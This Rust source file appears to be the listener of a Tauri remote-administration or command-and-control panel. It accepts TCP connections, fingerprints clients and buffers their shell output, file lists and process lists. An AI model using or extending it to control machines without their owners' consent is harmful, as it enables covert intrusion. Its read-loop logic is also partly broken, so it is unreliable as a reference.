use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use tauri::{AppHandle, Manager};

use crate::client;

fn get_client(mut stream: TcpStream) -> Vec<String> {
    stream
        .write_all(b"init_client\n----------ENDOFCONTENT----------\n")
        .unwrap();

    let received = read_buffer(stream.try_clone().unwrap()).unwrap();
    let value = String::from_utf8_lossy(received.as_slice()).to_string();

    value
        .split("::")
        .collect::<Vec<&str>>()
        .iter()
        .map(|x| x.to_string())
        .collect()
}

#[derive(Clone)]
pub struct Server {
    pub tauri_handle: Arc<Mutex<AppHandle>>,
    pub clients: Arc<Mutex<Vec<client::Client>>>,

    shell: Arc<Mutex<Vec<String>>>,

    files: Arc<Mutex<Vec<String>>>,
    folders: Arc<Mutex<String>>,
    process_list: Arc<Mutex<String>>,
}

impl Server {
    pub fn new(app_handle: AppHandle) -> Self {
        Server {
            tauri_handle: Arc::new(Mutex::new(app_handle)),
            clients: Arc::new(Mutex::new(Vec::new())),
            shell: Arc::new(Mutex::new(Vec::new())),
            files: Arc::new(Mutex::new(Vec::new())),
            folders: Arc::new(Mutex::new(String::new())),
            process_list: Arc::new(Mutex::new(String::new())),
        }
    }

    pub fn get_files (&self) -> Vec<String> {
        self.files.lock().unwrap().clone()
    }

    pub fn reset_files (&mut self) {
        self.files.lock().unwrap().clear();
    }

    pub fn get_folder_path (&self) -> String {
        self.folders.lock().unwrap().clone()
    }

    pub fn reset_folder_path (&mut self) {
        self.folders.lock().unwrap().clear();
    }

    pub fn get_shell (&self) -> Vec<String> {
        self.shell.lock().unwrap().clone()
    }

    pub fn reset_shell (&mut self) {
        self.shell.lock().unwrap().clear();
    }
    
    pub fn get_process_list (&self) -> String {
        self.process_list.lock().unwrap().clone()
    }

    pub fn listen_port(&mut self, port: String) -> bool {
        let listener = TcpListener::bind("0.0.0.0:".to_string() + port.as_str());

        if let Ok(stream) = listener {
            let vec = Arc::clone(&self.clients);
            let cout = Arc::clone(&self.shell);
            let fl = Arc::clone(&self.files);
            let fp = Arc::clone(&self.folders);
            let pl = Arc::clone(&self.process_list);
            let tauri_handle = Arc::clone(&self.tauri_handle);


            tokio::task::spawn(async move {
                for i in stream.incoming() {
                    println!("New Client!");

                    if i.is_err() {
                        break;
                    }

                    let stream = i.unwrap();
                    let ip = stream
                        .try_clone()
                        .unwrap()
                        .peer_addr()
                        .unwrap()
                        .ip()
                        .to_string();
                    let info = get_client(stream.try_clone().unwrap());


                    let client = client::Client::new(
                        Arc::clone(&tauri_handle),
                        stream.try_clone().unwrap(),
                        info[1].clone(),
                        info[2].clone(),
                        info[3].clone(),
                        info[4].clone(),
                        info[5].clone(),
                        info[6].split(',').map(|x| x.to_string()).collect(),
                        info[7].split(',').map(|x| x.to_string()).collect(),
                        info[8].parse().unwrap(),
                        ip.clone(),
                        info[9].parse().unwrap(),
                        Arc::clone(&cout),
                        Arc::clone(&fl),
                        Arc::clone(&fp),
                        Arc::clone(&pl)
                    );

                    let _ = tauri_handle.lock().unwrap().emit_all("client_connected", info[1].clone());

                    vec.lock().unwrap().push(client);
                }
            });
            true
        } else {
            false
        }
    }
}

fn read_buffer(mut stream: TcpStream) -> Result<Vec<u8>, ()> {
    let mut buffer = [0_u8; 1024];
    match stream.read(&mut buffer) {
        Ok(size) => {
            if size == 0 {
                return Err(());
            }

            let mut vect: Vec<u8> = Vec::new();
            for v in &buffer {
                if *v > 0_u8 {
                    vect.push(*v);
                }
            }

            if size > 1024 {
                let repeat = size / 1024;
                for _i in 0..repeat {
                    stream.read_exact(&mut buffer).unwrap();
                    for v in &buffer {
                        if *v > 0_u8 {
                            vect.push(*v);
                        }
                    }
                }
            }
            Ok(vect)
        }
        Err(_) => Err(()),
    }
}
